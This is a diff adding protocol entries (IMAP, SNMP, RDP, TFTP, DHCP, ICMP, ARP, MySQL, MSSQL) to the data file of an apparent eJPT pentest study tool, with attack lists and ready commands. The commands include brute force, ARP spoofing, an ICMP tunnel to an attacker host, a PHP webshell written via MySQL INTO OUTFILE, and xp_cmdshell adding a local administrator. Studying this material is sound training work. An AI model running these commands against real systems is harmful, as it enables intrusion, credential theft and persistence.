+    risks: [{label:'Cleartext Auth',class:'risk-high',val:95},{label:'Brute Force',class:'risk-high',val:75},{label:'Email Harvest',class:'risk-med',val:60}]
+  },
+
+  {
+    id: 'p-imap', num: '10', name: 'IMAP', full: 'Internet Message Access Protocol',
+    port: '143 (plain), 993 (SSL)', transport: 'tcp', layer: 'l7', categories: ['email'],
+    risk: 'med', icon: '📮', iconBg: 'rgba(224,144,48,0.12)',
+    shortDesc: 'Reads emails from server without deleting. Supports multiple clients, folders. Cleartext on port 143.',
+    structure: `IMAP keeps email on the server and syncs multiple clients. Unlike POP3, emails are not deleted by default. Supports folders, search, and flags. Port 143 is cleartext; 993 uses SSL/TLS.`,
+    packetFields: [
+      {name:'Port', val:'143/993', key:true},
+      {name:'Auth', val:'Login/PLAIN', key:true},
+      {name:'Encryption', val:'None/TLS', key:false},
+      {name:'SELECT', val:'Choose folder', key:false},
+      {name:'FETCH', val:'Get message', key:false},
+      {name:'SEARCH', val:'Query msgs', key:false},
+    ],
+    howItWorks: ['Client connects to port 143','Server: * OK IMAP server ready','a1 LOGIN user password (cleartext!)','a2 SELECT INBOX → opens folder','a3 FETCH 1 (RFC822) → full message content','a4 SEARCH FROM "boss@corp.com" → search','a5 LOGOUT'],
+    commands: [
+      { label: 'Manual IMAP session', code: `<span class="code-cmd">nc</span> <span class="code-target">[target]</span> 143
+<span class="code-comment"># IMAP needs a tag prefix (a1, a2...)</span>
+<span class="code-highlight">a1 LOGIN</span> <span class="code-target">admin</span> <span class="code-target">password</span>
+<span class="code-highlight">a2 LIST</span> "" "*"
+<span class="code-highlight">a3 SELECT</span> INBOX
+<span class="code-highlight">a4 FETCH 1 RFC822</span>
+<span class="code-highlight">a5 LOGOUT</span>` },
+      { label: 'Nmap + Hydra', code: `<span class="code-cmd">nmap</span> <span class="code-flag">-p 143 --script imap-capabilities</span> <span class="code-target">[target]</span>
+<span class="code-cmd">nmap</span> <span class="code-flag">-p 143 --script imap-ntlm-info</span> <span class="code-target">[target]</span>
+<span class="code-cmd">hydra</span> <span class="code-flag">-l</span> admin <span class="code-flag">-P</span> rockyou.txt <span class="code-target">[target]</span> imap` },
+    ],
+    attacks: [
+      {name:'Cleartext Auth Sniff',desc:'LOGIN command sends credentials in plaintext',impact:'Critical',tools:['wireshark']},
+      {name:'Brute Force',desc:'Credential stuffing against port 143',impact:'High',tools:['hydra']},
+      {name:'Email Content Access',desc:'Read all INBOX/Sent mail for sensitive data',impact:'High',tools:['nc','thunderbird']},
+    ],
+    examTip: 'IMAP and POP3 are often in the same "email services" enumeration block in eJPT. Key: banner grab, brute force with Hydra, read emails if you get in. IMAP has more features than POP3 for investigation.',
+    fieldTip: 'IMAP access on a corporate account during a pentest can yield passwords in emails, internal documentation, VPN configs, and sensitive attachments. Document all found data carefully.',
+    risks: [{label:'Cleartext',class:'risk-high',val:90},{label:'Brute Force',class:'risk-high',val:75},{label:'Info Harvest',class:'risk-high',val:85}]
+  },
+
+  {
+    id: 'p-snmp', num: '11', name: 'SNMP', full: 'Simple Network Management Protocol',
+    port: '161 (queries), 162 (traps)', transport: 'udp', layer: 'l7', categories: ['infra','high'],
+    risk: 'high', icon: '📡', iconBg: 'rgba(224,85,85,0.12)',
+    shortDesc: 'Network device management protocol. Community strings = passwords. "public" default exposes everything.',
+    structure: `SNMP uses a Manager-Agent model. The Manager queries Agents running on devices. Data is organized in a MIB (Management Information Base) tree. SNMPv1/v2c uses community strings (basically cleartext passwords). SNMPv3 adds encryption.`,
+    packetFields: [
+      {name:'Version', val:'v1/v2c/v3', key:true},
+      {name:'Port', val:'161 UDP', key:true},
+      {name:'Community', val:'"public"', key:true},
+      {name:'PDU Type', val:'GET/SET', key:false},
+      {name:'OID', val:'1.3.6.1.x.x', key:false},
+      {name:'Value', val:'MIB data', key:false},
+    ],
+    howItWorks: ['Manager sends GET request to port 161 UDP','Includes community string ("public") as auth','Agent checks community string','If correct: returns requested OID value from MIB','Bulk retrieval: GetBulk pulls entire MIB subtree','Agents send Traps to Manager on port 162 for alerts'],
+    commands: [
+      { label: 'snmpwalk — dump entire MIB', code: `<span class="code-cmd">snmpwalk</span> <span class="code-flag">-c public -v1</span> <span class="code-target">[target]</span>
+<span class="code-cmd">snmpwalk</span> <span class="code-flag">-c public -v2c</span> <span class="code-target">[target]</span>
+<span class="code-comment"># Dump system info only:</span>
+<span class="code-cmd">snmpwalk</span> <span class="code-flag">-c public -v2c</span> <span class="code-target">[target]</span> 1.3.6.1.2.1.1
+<span class="code-comment"># Get running processes:</span>
+<span class="code-cmd">snmpwalk</span> <span class="code-flag">-c public -v2c</span> <span class="code-target">[target]</span> 1.3.6.1.2.1.25.4.2` },
+      { label: 'Nmap SNMP scripts', code: `<span class="code-cmd">nmap</span> <span class="code-flag">-sU -p 161 --script snmp-info</span> <span class="code-target">[target]</span>
+<span class="code-cmd">nmap</span> <span class="code-flag">-sU -p 161 --script snmp-sysdescr</span> <span class="code-target">[target]</span>
+<span class="code-cmd">nmap</span> <span class="code-flag">-sU -p 161 --script snmp-processes</span> <span class="code-target">[target]</span>
+<span class="code-cmd">nmap</span> <span class="code-flag">-sU -p 161 --script snmp-brute</span> <span class="code-target">[target]</span>` },
+      { label: 'Brute force community strings', code: `<span class="code-cmd">hydra</span> <span class="code-flag">-P</span> <span class="code-target">/usr/share/wordlists/metasploit/snmp_default_pass.txt</span> <span class="code-target">[target]</span> snmp
+<span class="code-cmd">onesixtyone</span> <span class="code-flag">-c</span> community_strings.txt <span class="code-target">[target]</span>` },
+    ],
+    attacks: [
+      {name:'Default Community String',desc:'"public" community string exposes full MIB — OS, users, procs',impact:'High',tools:['snmpwalk','nmap snmp-info']},
+      {name:'Community String Brute Force',desc:'Guess write community strings to modify device config',impact:'Critical',tools:['onesixtyone','hydra','msf']},
+      {name:'Information Disclosure',desc:'MIB reveals: hostname, interfaces, routes, users, running procs',impact:'High',tools:['snmpwalk','snmp-check']},
+      {name:'Config Extraction',desc:'Pull router configs via SNMP TFTP combination',impact:'Critical',tools:['snmptftp']},
+    ],
+    examTip: 'SNMP is always tested in eJPT network assessments. Always scan UDP port 161: nmap -sU -p 161 [target]. Try community "public" and "private". snmpwalk -c public -v2c [target] dumps everything.',
+    fieldTip: 'SNMP on network equipment exposes: interface IPs, routing tables, ARP cache, running processes, device serial numbers, and software versions. Write community access = reconfigure the device.',
+    risks: [{label:'Default Strings',class:'risk-high',val:90},{label:'Info Leak',class:'risk-high',val:85},{label:'Config Theft',class:'risk-high',val:80}]
+  },
+
+  {
+    id: 'p-rdp', num: '12', name: 'RDP', full: 'Remote Desktop Protocol',
+    port: '3389', transport: 'tcp', layer: 'l7', categories: ['remote','high'],
+    risk: 'high', icon: '🖥️', iconBg: 'rgba(224,85,85,0.12)',
+    shortDesc: 'Windows graphical remote access. BlueKeep, DejaBlue, brute force. Very common attack surface.',
+    structure: `RDP provides full graphical desktop access to Windows over an encrypted channel. Uses certificate-based TLS. Vulnerable to: BlueKeep (unauthenticated RCE), brute force, credential relay. Default port 3389 TCP.`,
+    packetFields: [
+      {name:'Port', val:'3389', key:true},
+      {name:'Transport', val:'TCP', key:false},
+      {name:'Encryption', val:'TLS/RC4', key:false},
+      {name:'Auth', val:'NLA or classic', key:true},
+      {name:'NLA', val:'CredSSP', key:false},
+      {name:'Clipboard', val:'Shared', key:false},
+    ],
+    howItWorks: ['Client initiates TCP to port 3389','RDP negotiation: security protocol selection','TLS or NLA (Network Level Authentication) handshake','User authenticates with Windows credentials','Full desktop rendered and streamed to client','Input (keyboard/mouse) sent back to server'],
+    commands: [
+      { label: 'Nmap RDP detection & scan', code: `<span class="code-cmd">nmap</span> <span class="code-flag">-p 3389 --script rdp-enum-encryption</span> <span class="code-target">[target]</span>
+<span class="code-cmd">nmap</span> <span class="code-flag">-p 3389 --script rdp-vuln-ms12-020</span> <span class="code-target">[target]</span>
+<span class="code-cmd">nmap</span> <span class="code-flag">-p 3389 -sV</span> <span class="code-target">[target]</span>` },
+      { label: 'Brute force RDP', code: `<span class="code-cmd">hydra</span> <span class="code-flag">-l</span> administrator <span class="code-flag">-P</span> rockyou.txt <span class="code-flag">-t 1</span> <span class="code-target">[target]</span> rdp
+<span class="code-cmd">ncrack</span> <span class="code-flag">-U</span> users.txt <span class="code-flag">-P</span> pass.txt <span class="code-flag">rdp://[target]</span>` },
+      { label: 'Connect to RDP', code: `<span class="code-comment"># From Kali Linux:</span>
+<span class="code-cmd">xfreerdp</span> <span class="code-flag">/u:administrator /p:Password123 /v:</span><span class="code-target">[target]</span>
+<span class="code-cmd">rdesktop</span> <span class="code-flag">-u</span> administrator <span class="code-flag">-p</span> Password123 <span class="code-target">[target]</span>` },
+      { label: 'BlueKeep check (CVE-2019-0708)', code: `<span class="code-cmd">use</span> auxiliary/scanner/rdp/cve_2019_0708_bluekeep
+<span class="code-cmd">set</span> RHOSTS <span class="code-target">[target]</span>
+<span class="code-cmd">run</span>
+<span class="code-comment"># Affects: Windows XP/Vista/7/Server 2003/2008</span>` },
+    ],
+    attacks: [
+      {name:'BlueKeep (CVE-2019-0708)',desc:'Unauthenticated RCE on Win XP/7/Server 2003/2008',impact:'Critical',tools:['metasploit','rdpscan']},
+      {name:'DejaBlue (CVE-2019-1181/1182)',desc:'BlueKeep variant affecting Win 7/Server 2008 R2+',impact:'Critical',tools:['msf']},
+      {name:'Brute Force',desc:'Credential stuffing against RDP login',impact:'High',tools:['hydra','ncrack','crowbar']},
+      {name:'Pass-the-Hash via RDP',desc:'Use NTLM hash to authenticate to RDP with Restricted Admin',impact:'Critical',tools:['mimikatz','xfreerdp']},
+    ],
+    examTip: 'RDP on port 3389 = check for BlueKeep first (affects Windows 7 / Server 2008). Then try brute force with Hydra. If you get NTLM hashes, try pass-the-hash via xfreerdp with /pth flag.',
+    fieldTip: 'RDP exposed to internet is extremely dangerous and extremely common. Check shodan for org:target port:3389. Brute force is noisy but still works. BlueKeep is rare now but patching isn\'t universal.',
+    risks: [{label:'BlueKeep',class:'risk-high',val:95},{label:'Brute Force',class:'risk-high',val:80},{label:'Pass-Hash',class:'risk-high',val:88}]
+  },
+
+  {
+    id: 'p-tftp', num: '13', name: 'TFTP', full: 'Trivial File Transfer Protocol',
+    port: '69', transport: 'udp', layer: 'l7', categories: ['file'],
+    risk: 'med', icon: '📤', iconBg: 'rgba(224,144,48,0.12)',
+    shortDesc: 'Minimal UDP-based file transfer. No authentication. Used by routers, PXE boot, IoT. Often misconfigured.',
+    structure: `TFTP is an extremely simple file transfer protocol using UDP. NO authentication, NO directory listing. Uses 512-byte blocks. Used for bootstrapping devices — routers uploading firmware, PXE network boot.`,
+    packetFields: [
+      {name:'Port', val:'69 UDP', key:true},
+      {name:'Auth', val:'NONE', key:true},
+      {name:'Transport', val:'UDP', key:false},
+      {name:'Block Size', val:'512 bytes', key:false},
+      {name:'Modes', val:'netascii/octet', key:false},
+      {name:'Direction', val:'GET or PUT', key:false},
+    ],
+    howItWorks: ['Client sends Read Request (RRQ) or Write Request (WRQ) to UDP port 69','Server opens a new ephemeral UDP port for transfer','Data sent in 512-byte DATA packets','Client ACKs each block','Transfer ends when block < 512 bytes','No encryption, no auth — anyone on network can download'],
+    commands: [
+      { label: 'TFTP file operations', code: `<span class="code-cmd">tftp</span> <span class="code-target">[target]</span>
+tftp> <span class="code-cmd">get</span> <span class="code-target">cisco-config.txt</span>
+tftp> <span class="code-cmd">put</span> <span class="code-target">evil.conf</span>
+tftp> <span class="code-cmd">quit</span>
+<span class="code-comment"># One-liner:</span>
+<span class="code-cmd">tftp</span> <span class="code-flag">-i</span> <span class="code-target">[target]</span> GET <span class="code-target">filename.cfg</span>` },
+      { label: 'Nmap TFTP detection', code: `<span class="code-cmd">nmap</span> <span class="code-flag">-sU -p 69</span> <span class="code-target">[target]</span>
+<span class="code-cmd">nmap</span> <span class="code-flag">-sU -p 69 --script tftp-enum</span> <span class="code-target">[target]</span>` },
+      { label: 'Metasploit TFTP enumeration', code: `<span class="code-cmd">use</span> auxiliary/scanner/tftp/tftpbrute
+<span class="code-cmd">set</span> RHOSTS <span class="code-target">[target]</span>
+<span class="code-cmd">run</span>
+<span class="code-comment"># Try common filenames: running-config, startup-config</span>` },
+    ],
+    attacks: [
+      {name:'Config File Download',desc:'Download router configs — contains credentials',impact:'Critical',tools:['tftp','msf']},
+      {name:'Firmware Upload',desc:'Replace device firmware with malicious version',impact:'Critical',tools:['tftp']},
+      {name:'File Brute Force',desc:'Guess filenames since no directory listing',impact:'Med',tools:['msf tftpbrute','tftp']},
+    ],
+    examTip: 'TFTP on UDP 69 — always try to download config files: tftp> get startup-config. Network gear configs often contain ENABLE passwords, interface IPs, and route tables.',
+    fieldTip: 'TFTP combined with SNMP is a classic router attack: use SNMP write to trigger a config backup via TFTP to an attacker-controlled server, then read the router config offline.',
+    risks: [{label:'No Auth',class:'risk-high',val:85},{label:'Config Leak',class:'risk-high',val:90},{label:'File Upload',class:'risk-high',val:80}]
+  },
+
+  {
+    id: 'p-dhcp', num: '14', name: 'DHCP', full: 'Dynamic Host Configuration Protocol',
+    port: '67 (server), 68 (client)', transport: 'udp', layer: 'l7', categories: ['infra'],
+    risk: 'med', icon: '⚡', iconBg: 'rgba(224,144,48,0.12)',
+    shortDesc: 'Assigns IP addresses automatically. Rogue DHCP server attack can redirect all traffic.',
+    structure: `DHCP uses a DORA process: Discover → Offer → Request → Acknowledge. Client broadcasts on UDP, server responds with IP, subnet, gateway, and DNS server. No authentication — first server to respond wins.`,
+    packetFields: [
+      {name:'Port', val:'67/68 UDP', key:true},
+      {name:'DORA', val:'Discovery', key:true},
+      {name:'Offers', val:'IP + Mask', key:false},
+      {name:'Gateway', val:'Router IP', key:true},
+      {name:'DNS', val:'DNS IP', key:true},
+      {name:'Lease', val:'Time limit', key:false},
+    ],
+    howItWorks: ['Client broadcasts DHCPDISCOVER on 255.255.255.255:67','Servers respond with DHCPOFFER (IP, mask, gateway, DNS)','Client broadcasts DHCPREQUEST to accept one offer','Server responds with DHCPACK confirming the lease','Client configures NIC with the provided settings','Lease expires → repeat process'],
+    commands: [
+      { label: 'DHCP starvation / rogue server', code: `<span class="code-comment"># DHCP Starvation — exhaust all IPs in pool:</span>
+<span class="code-cmd">dhcpstarv</span> <span class="code-flag">-i</span> eth0
+<span class="code-comment"># Then run Rogue DHCP server to respond to new clients</span>
+<span class="code-comment"># Set YOUR machine as the gateway → all traffic routes through you</span>` },
+      { label: 'View DHCP leases & server info', code: `<span class="code-cmd">nmap</span> <span class="code-flag">--script broadcast-dhcp-discover</span>
+<span class="code-cmd">nmap</span> <span class="code-flag">-sU -p 67 --script dhcp-discover</span> <span class="code-target">[target]</span>
+<span class="code-comment"># On Linux — current lease info:</span>
+cat /var/lib/dhcp/dhclient.leases</code>` },
+    ],
+    attacks: [
+      {name:'DHCP Starvation',desc:'Exhaust IP pool → DoS for new clients joining network',impact:'High',tools:['dhcpstarv','yersinia']},
+      {name:'Rogue DHCP Server',desc:'Send malicious gateway/DNS to redirect all traffic',impact:'Critical',tools:['dnsmasq','yersinia']},
+      {name:'DHCP Snooping Bypass',desc:'Bypass DHCP snooping protections in some switches',impact:'Med',tools:['yersinia']},
+    ],
+    examTip: 'DHCP attacks are more theoretical in eJPT but understanding DORA and rogue DHCP is expected. Know that a rogue DHCP server can set the gateway to an attacker machine for MITM.',
+    fieldTip: 'DHCP snooping on managed switches prevents rogue DHCP attacks. On physical assessments, plugging into an unprotected switch port and running a rogue DHCP server can intercept all traffic from new connections.',
+    risks: [{label:'Rogue Server',class:'risk-high',val:85},{label:'Starvation DoS',class:'risk-high',val:80},{label:'MITM',class:'risk-high',val:90}]
+  },
+
+  {
+    id: 'p-icmp', num: '15', name: 'ICMP', full: 'Internet Control Message Protocol',
+    port: 'No port (IP Protocol 1)', transport: 'both', layer: 'l3', categories: ['infra'],
+    risk: 'low', icon: '📶', iconBg: 'rgba(74,180,90,0.12)',
+    shortDesc: 'Network diagnostic protocol. Ping uses ICMP. Used for host discovery, traceroute, and tunneling.',
+    structure: `ICMP is a layer 3 protocol — no ports. It carries diagnostic messages. Type 8 = Echo Request (ping). Type 0 = Echo Reply. Type 3 = Destination Unreachable. Type 11 = TTL Exceeded (used by traceroute).`,
+    packetFields: [
+      {name:'Type', val:'8 = Request', key:true},
+      {name:'Code', val:'0 = default', key:false},
+      {name:'Checksum', val:'Verify', key:false},
+      {name:'Identifier', val:'Session ID', key:false},
+      {name:'Sequence', val:'Counter', key:false},
+      {name:'Data', val:'Payload', key:true},
+    ],
+    howItWorks: ['Host A sends Echo Request (Type 8, Code 0) to Host B','Host B replies with Echo Reply (Type 0, Code 0)','If host unreachable: intermediate router sends Type 3 back','Traceroute exploits TTL — sends packets with TTL=1,2,3... causing Type 11 replies at each hop','Firewalls often block ICMP → host may be alive but not pingable'],
+    commands: [
+      { label: 'Ping and host discovery', code: `<span class="code-cmd">ping</span> <span class="code-flag">-c 4</span> <span class="code-target">[target]</span>
+<span class="code-comment"># Nmap ICMP scan (ping sweep):</span>
+<span class="code-cmd">nmap</span> <span class="code-flag">-sn</span> <span class="code-target">192.168.1.0/24</span>
+<span class="code-comment"># ICMP + TCP + ARP combined discovery:</span>
+<span class="code-cmd">nmap</span> <span class="code-flag">-PE -PP -PM -sn</span> <span class="code-target">192.168.1.0/24</span>` },
+      { label: 'Traceroute', code: `<span class="code-cmd">traceroute</span> <span class="code-target">target.com</span>
+<span class="code-cmd">tracepath</span> <span class="code-target">target.com</span>
+<span class="code-cmd">nmap</span> <span class="code-flag">--traceroute</span> <span class="code-target">[target]</span>` },
+      { label: 'ICMP tunneling', code: `<span class="code-comment"># Tunnel data inside ICMP echo payloads</span>
+<span class="code-comment"># Tool: ptunnel (Ping Tunnel)</span>
+<span class="code-comment"># Server side (attacker):</span>
+<span class="code-cmd">ptunnel</span>
+<span class="code-comment"># Client side:</span>
+<span class="code-cmd">ptunnel</span> <span class="code-flag">-p</span> <span class="code-target">attacker_ip</span> <span class="code-flag">-lp 8000 -da internal -dp 22</span>` },
+    ],
+    attacks: [
+      {name:'ICMP Sweep',desc:'Discover live hosts without port scanning',impact:'Low',tools:['nmap -sn','fping','ping']},
+      {name:'ICMP Tunneling',desc:'Exfiltrate data / create covert channel inside ICMP',impact:'Med',tools:['ptunnel','icmptunnel']},
+      {name:'Smurf Attack',desc:'Amplify ICMP floods using broadcast (historical)',impact:'High',tools:['custom']},
+      {name:'Ping of Death',desc:'Oversized ICMP packets crash old systems (historical)',impact:'High',tools:['custom']},
+    ],
+    examTip: 'Ping sweeps are the first step in network discovery. nmap -sn [range] uses ICMP. Important: firewalls often block ICMP, so -sn missing hosts doesn\'t mean hosts are down — follow up with TCP scans.',
+    fieldTip: 'ICMP tunneling through firewalls is a real exfiltration/C2 technique — many orgs allow ICMP outbound but not arbitrary TCP/UDP. Tools like ptunnel or ICMP C2 frameworks leverage this.',
+    risks: [{label:'Tunneling',class:'risk-med',val:55},{label:'Host Discovery',class:'risk-low',val:30},{label:'Legacy DoS',class:'risk-low',val:20}]
+  },
+
+  {
+    id: 'p-arp', num: '16', name: 'ARP', full: 'Address Resolution Protocol',
+    port: 'No port (Layer 2)', transport: 'both', layer: 'l3', categories: ['infra'],
+    risk: 'high', icon: '🔗', iconBg: 'rgba(224,85,85,0.12)',
+    shortDesc: 'Resolves IP addresses to MAC addresses on a local network. ARP spoofing = MITM all traffic.',
+    structure: `ARP works at Layer 2. When a device needs to send to an IP on the local network, it broadcasts "Who has IP X?" The device with that IP replies "I am MAC Y". ARP has NO authentication — any machine can claim any IP.`,
+    packetFields: [
+      {name:'Type', val:'Request / Reply', key:true},
+      {name:'Sender IP', val:'Requester IP', key:false},
+      {name:'Sender MAC', val:'Requester MAC', key:false},
+      {name:'Target IP', val:'Who are you?', key:true},
+      {name:'Target MAC', val:'00:00:00 (req)', key:false},
+      {name:'Auth', val:'NONE', key:true},
+    ],
+    howItWorks: ['Device A wants to send to 192.168.1.10','Checks ARP cache — not found','Broadcasts: "Who has 192.168.1.10? Tell 192.168.1.1"','Device with that IP replies with its MAC address','Device A caches the IP→MAC mapping','ARP cache entries expire after a short time (typically 5 min)'],
+    commands: [
+      { label: 'ARP spoofing — MITM attack', code: `<span class="code-comment"># Enable IP forwarding first</span>
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+<span class="code-comment"># Poison victim's ARP cache (victim thinks YOU are gateway)</span>
+<span class="code-cmd">arpspoof</span> <span class="code-flag">-i</span> eth0 <span class="code-flag">-t</span> <span class="code-target">[victim_ip]</span> <span class="code-target">[gateway_ip]</span>
+
+<span class="code-comment"># Poison gateway's ARP cache (gateway thinks YOU are victim)</span>
+<span class="code-cmd">arpspoof</span> <span class="code-flag">-i</span> eth0 <span class="code-flag">-t</span> <span class="code-target">[gateway_ip]</span> <span class="code-target">[victim_ip]</span>
+
+<span class="code-comment"># Now capture all traffic in Wireshark</span>` },
+      { label: 'View ARP table', code: `<span class="code-cmd">arp</span> <span class="code-flag">-n</span>                   <span class="code-comment"># show ARP cache</span>
+<span class="code-cmd">nmap</span> <span class="code-flag">-PR -sn</span> <span class="code-target">192.168.1.0/24</span>  <span class="code-comment"># ARP ping sweep (local only)</span>
+<span class="code-cmd">netdiscover</span> <span class="code-flag">-r</span> <span class="code-target">192.168.1.0/24</span>  <span class="code-comment"># passive + active ARP</span>` },
+    ],
+    attacks: [
+      {name:'ARP Spoofing',desc:'Send gratuitous ARPs to poison cache — intercept all traffic',impact:'Critical',tools:['arpspoof','ettercap','bettercap']},
+      {name:'ARP Flood / DoS',desc:'Flood switch MAC table to force hub-mode behavior',impact:'High',tools:['macof','yersinia']},
+      {name:'Passive Discovery',desc:'Sniff ARP traffic to map all hosts without sending packets',impact:'Low',tools:['netdiscover','wireshark']},
+    ],
+    examTip: 'ARP spoofing is the foundation of MITM attacks. Enable IP forwarding (echo 1 > /proc/sys/net/ipv4/ip_forward) BEFORE running arpspoof, or you\'ll DoS the victim instead of intercepting traffic.',
+    fieldTip: 'ARP attacks only work on the local network segment. Dynamic ARP Inspection (DAI) on managed switches prevents this. In a physical pentest, plugging into an unprotected switch enables this immediately.',
+    risks: [{label:'ARP Spoof MITM',class:'risk-high',val:95},{label:'MAC Flood',class:'risk-high',val:80},{label:'Passive Recon',class:'risk-low',val:25}]
+  },
+
+  {
+    id: 'p-mysql', num: '17', name: 'MySQL', full: 'MySQL / MariaDB Database',
+    port: '3306', transport: 'tcp', layer: 'l7', categories: ['infra','high'],
+    risk: 'high', icon: '🗄️', iconBg: 'rgba(224,85,85,0.12)',
+    shortDesc: 'Most common open-source database. Exposed port 3306 = direct SQL access, credential brute force, data exfil.',
+    structure: `MySQL listens on TCP port 3306. The protocol is binary with packet framing. Authentication requires username/password. Should NEVER be exposed externally — is frequently found in misconfigured web servers.`,
+    packetFields: [
+      {name:'Port', val:'3306 TCP', key:true},
+      {name:'Auth', val:'User+Hash', key:true},
+      {name:'Protocol', val:'Binary', key:false},
+      {name:'Charset', val:'UTF-8', key:false},
+      {name:'DB', val:'Selected at login', key:false},
+      {name:'SSL', val:'Optional', key:false},
+    ],
+    howItWorks: ['Client connects to 3306','Server sends Server Greeting (version, capabilities)','Client sends Handshake Response (username, password hash)','Server authenticates and sends OK or Error','Client sends SQL query packets','Server responds with ResultSet rows'],
+    commands: [
+      { label: 'Connect to MySQL', code: `<span class="code-cmd">mysql</span> <span class="code-flag">-u root -p</span> <span class="code-flag">-h</span> <span class="code-target">[target]</span>
+<span class="code-cmd">mysql</span> <span class="code-flag">-u root -h</span> <span class="code-target">[target]</span> <span class="code-flag">--password=""</span>
+<span class="code-comment"># Try blank root password — very common!</span>` },
+      { label: 'MySQL enumeration after login', code: `<span class="code-cmd">SHOW DATABASES;</span>
+<span class="code-cmd">USE</span> <span class="code-target">dvwa</span>;
+<span class="code-cmd">SHOW TABLES;</span>
+<span class="code-cmd">SELECT</span> * FROM <span class="code-target">users</span>;
+<span class="code-comment"># Read files from server:</span>
+<span class="code-cmd">SELECT LOAD_FILE</span>('/etc/passwd');
+<span class="code-comment"># Write webshell:</span>
+<span class="code-cmd">SELECT</span> '&lt;?php system($<span class="code-target">_GET["cmd"]</span>); ?&gt;' INTO OUTFILE '/var/www/html/shell.php';` },
+      { label: 'Nmap & brute force', code: `<span class="code-cmd">nmap</span> <span class="code-flag">-p 3306 --script mysql-info</span> <span class="code-target">[target]</span>
+<span class="code-cmd">nmap</span> <span class="code-flag">-p 3306 --script mysql-empty-password</span> <span class="code-target">[target]</span>
+<span class="code-cmd">nmap</span> <span class="code-flag">-p 3306 --script mysql-databases</span> <span class="code-flag">--script-args</span> <span class="code-target">mysqluser=root</span> <span class="code-target">[target]</span>
+<span class="code-cmd">hydra</span> <span class="code-flag">-l root -P</span> rockyou.txt <span class="code-target">[target]</span> mysql` },
+    ],
+    attacks: [
+      {name:'Blank Root Password',desc:'Root has no password on default MySQL installs',impact:'Critical',tools:['mysql -u root','nmap mysql-empty-password']},
+      {name:'Brute Force',desc:'Dictionary attack on MySQL credentials',impact:'High',tools:['hydra','medusa','msf']},
+      {name:'LOAD_FILE() / INTO OUTFILE',desc:'Read system files / write webshells via SQL',impact:'Critical',tools:['mysql','sqlmap']},
+      {name:'UDF Injection',desc:'Create User-Defined Function to execute OS commands',impact:'Critical',tools:['msf mysql_udf_payload']},
+    ],
+    examTip: 'MySQL on port 3306 exposed = first try root with blank password. Then: SHOW DATABASES, SELECT * FROM users. The SELECT ... INTO OUTFILE trick can write PHP webshells to the web root for RCE.',
+    fieldTip: 'MySQL bound to 0.0.0.0 (all interfaces) instead of 127.0.0.1 is a finding. MySQL running as root OS user is critical — UDF injection gives OS root. Check /etc/mysql/my.cnf for bind-address.',
+    risks: [{label:'Blank Password',class:'risk-high',val:90},{label:'File Read/Write',class:'risk-high',val:88},{label:'UDF RCE',class:'risk-high',val:95}]
+  },
+
+  {
+    id: 'p-mssql', num: '18', name: 'MSSQL', full: 'Microsoft SQL Server',
+    port: '1433', transport: 'tcp', layer: 'l7', categories: ['infra','high'],
+    risk: 'high', icon: '💾', iconBg: 'rgba(224,85,85,0.12)',
+    shortDesc: 'Microsoft\'s enterprise database. xp_cmdshell enables OS command execution directly from SQL.',
+    structure: `MSSQL listens on TCP 1433 (UDP 1434 for discovery). Uses TDS (Tabular Data Stream) protocol. The sa (System Administrator) account is the highest privilege. xp_cmdshell is a stored procedure that executes OS commands — massive attack surface.`,
+    packetFields: [
+      {name:'Port', val:'1433 TCP', key:true},
+      {name:'Discovery', val:'1434 UDP', key:false},
+      {name:'Auth', val:'SA or Windows', key:true},
+      {name:'Protocol', val:'TDS', key:false},
+      {name:'xp_cmdshell', val:'OS RCE', key:true},
+      {name:'Impersonation', val:'EXECUTE AS', key:false},
+    ],
+    howItWorks: ['Client connects to 1433 TCP','TDS pre-login handshake','Login Request with credentials','Server returns Login Response (success/fail)','SQL queries over TDS protocol','xp_cmdshell: EXEC xp_cmdshell "whoami" → OS command executed by SQL process account'],
+    commands: [
+      { label: 'MSSQL enumeration with nmap', code: `<span class="code-cmd">nmap</span> <span class="code-flag">-p 1433 --script ms-sql-info</span> <span class="code-target">[target]</span>
+<span class="code-cmd">nmap</span> <span class="code-flag">-p 1433 --script ms-sql-empty-password</span> <span class="code-target">[target]</span>
+<span class="code-cmd">nmap</span> <span class="code-flag">-sU -p 1434 --script ms-sql-dac</span> <span class="code-target">[target]</span>` },
+      { label: 'Metasploit MSSQL modules', code: `<span class="code-comment"># Scanner</span>
+<span class="code-cmd">use</span> auxiliary/scanner/mssql/mssql_login
+<span class="code-cmd">set</span> RHOSTS <span class="code-target">[target]</span>; <span class="code-cmd">set</span> USERNAME sa; <span class="code-cmd">set</span> PASS_FILE rockyou.txt
+<span class="code-cmd">run</span>
+
+<span class="code-comment"># Execute commands via xp_cmdshell</span>
+<span class="code-cmd">use</span> exploit/windows/mssql/mssql_payload
+<span class="code-cmd">set</span> RHOSTS <span class="code-target">[target]</span>; <span class="code-cmd">set</span> USERNAME sa; <span class="code-cmd">set</span> PASSWORD password
+<span class="code-cmd">run</span>` },
+      { label: 'Enable and use xp_cmdshell', code: `<span class="code-comment">-- Enable xp_cmdshell (if disabled):</span>
+<span class="code-cmd">EXEC sp_configure</span> 'show advanced options', 1; <span class="code-cmd">RECONFIGURE</span>;
+<span class="code-cmd">EXEC sp_configure</span> 'xp_cmdshell', 1; <span class="code-cmd">RECONFIGURE</span>;
+
+<span class="code-comment">-- Execute OS command:</span>
+<span class="code-cmd">EXEC xp_cmdshell</span> 'whoami';
+<span class="code-cmd">EXEC xp_cmdshell</span> 'net user hacker Pass123 /add';
+<span class="code-cmd">EXEC xp_cmdshell</span> 'net localgroup administrators hacker /add';` },
+    ],
+    attacks: [
+      {name:'SA Blank/Default Password',desc:'"sa" account with blank or "sa" password = full DB access',impact:'Critical',tools:['msf mssql_login','hydra']},
+      {name:'xp_cmdshell RCE',desc:'Execute OS commands as the SQL service account',impact:'Critical',tools:['msf mssql_payload','manual SQL']},
+      {name:'Linked Server Attacks',desc:'Hop through linked SQL servers across network',impact:'Critical',tools:['msf','manual']},
+      {name:'Brute Force',desc:'Dictionary attack on SA and Windows SQL accounts',impact:'High',tools:['hydra','msf']},
+    ],
+    examTip: 'MSSQL + xp_cmdshell is one of the most powerful attack chains. If you find MSSQL with weak SA credentials, you can add admin users, run commands, and get a full shell via Metasploit mssql_payload.',
+    fieldTip: 'MSSQL often runs as NT AUTHORITY\\SYSTEM on Windows — xp_cmdshell gives SYSTEM-level OS access. Check SQL Server Agent jobs for scheduled tasks that can be hijacked for persistence.',
